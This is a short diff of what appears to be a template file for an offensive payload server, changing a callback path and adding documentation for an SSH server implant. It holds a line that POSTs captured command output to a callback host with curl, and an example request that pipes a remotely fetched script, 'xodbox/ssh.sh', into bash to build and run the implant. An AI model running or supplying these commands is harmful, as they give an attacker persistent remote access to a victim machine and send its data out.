@@ -20,9 +20,12 @@ data:
     disown
 
     echo $r
-    curl "{{.Request.Host}}/l/res/" --data "$r" -X POST
+    curl "{{.Request.Host}}/{{ .NotifyString }}/res/" --data "$r" -X POST
 ---
 
+Build an SSH server implant for the specific platform and execute it.
+
+### Example Request
 
 ```bash
 curl xodbox/ssh.sh|bash
